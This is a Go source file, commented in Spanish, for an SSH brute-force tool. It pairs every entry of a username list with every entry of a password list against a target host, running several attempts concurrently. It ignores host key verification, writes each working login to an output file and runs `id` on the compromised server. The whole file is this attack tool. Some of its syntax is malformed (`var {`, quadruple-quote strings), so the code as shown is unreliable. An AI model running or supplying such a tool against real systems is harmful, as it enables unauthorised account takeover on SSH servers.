package main 

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/ssh" //Modulo externo que simplemente proporciona un cliente SSH
)


//necesitamos de listas de users y pass.tx
//quizás antes de hacer el go build y compilar hay que hacer un 
//go get github.com/google/gopacket/pcapgo o de la crypto/ssh
//LIMIT is a length for the throttler channel
//Quizás se puede subir, es para que haga más concurrencia todavía
const LIMIT = 8

var throttler = make(chan int, LIMIT)

var {
	debug = flag.Bool("d", false, "Debugging, see whats going on")

	host	 = flag.String("h","""", "Host and port")
	userList = flag.String("u","""", "User list file")
	passList = flag.String("p","""", "Password list file")
	out		 = flag.String("o","""", "File to log data in")
}

func usage() {
	fmt.Printf("
Usage: %s [-h <HOST>:<PORT>] [-u USERFILE] [-p PASSWORDFILE] [-d]
Options:
	-h -u -p ya lo sabes
	-d debug
Example:
	%s -h 127.9.0.2:22 -u users.txt -p passwords.txt -o results.txt
		", os.Args[0], os.Args[0])
		os.Exit(1)
}

func dialHost() (err error){
	debugln("Trying to connect to host...")
	conn, err := net.Dial("tcp", *host)
	if err != nil{
		return
	}
	conn.Close()
	return
}

// Checks usernames/passwds and if succesfull, run id command
//Linea 71, ignoramos el mensaje de trust on this (1st time only)
func connect(wg *sync.WaitGroup, o *os.File, user, pass string) {
	// release channel
	defer wg.Done()

	debugln(fmt.Sprintf("Trying %s:%s...\n", user, pass))
	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         5 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	sshConfig.SetDefaults()

	c, err := ssh.Dial("tcp", *host, sshConfig)
	if err != nil {
		<-throttler
		return
	}
	defer c.Close()

	log.Printf("[Found] Got it! %s:%s\n", user, pass)
	fmt.Fprintf(o, "%s:%s\n", user, pass)

	debugln("Trying to run `id`...")

	session, err := c.NewSession()
	if err == nil {
		defer session.Close()

		debugln("Successfully ran `id`!")

		var s_out bytes.Buffer
		session.Stdout = &s_out

		if err = session.Run("id"); err == nil {
			fmt.Fprintf(o, "\t%s", s_out.String())
		}
	}
	<-throttler
}

func readFile(f string) (data []string, err error) {
	b, err := os.Open(f)
	if err != nil {
		return
	}
	defer b.Close()

	scanner := bufio.NewScanner(b)
	for scanner.Scan() {
		data = append(data, scanner.Text())
	}
	return
}

func debugln(s string) {
	if *debug {
		log.Println("[Debug]", s)
	}
}

func main() {
	flag.Parse()
	//Si está vacío sacamos el usage
	if *host == "" || *userList == "" || *passList == "" {
		usage()
	}

	if err := dialHost(); err != nil {
		log.Println("Couldn't connect to host, exiting.")
		os.Exit(1)
	}

	users, err := readFile(*userList)
	if err != nil {
		log.Println("Can't read user list, exiting.")
		os.Exit(1)
	}

	passwords, err := readFile(*passList)
	if err != nil {
		log.Println("Can't read passwords list, exiting.")
		os.Exit(1)
	}

	var outfile *os.File
	if *out == "" {
		outfile = os.Stdout
	} else {
		outfile, err = os.Create(*out)
		if err != nil {
			log.Println("Can't create file for writing, exiting.")
			os.Exit(1)
		}
		defer outfile.Close()
	}

	var wg sync.WaitGroup
	for _, user := range users {
		for _, pass := range passwords {
			throttler <- 0
			wg.Add(1)
			go connect(&wg, outfile, user, pass)
		}
	}
	wg.Wait()
}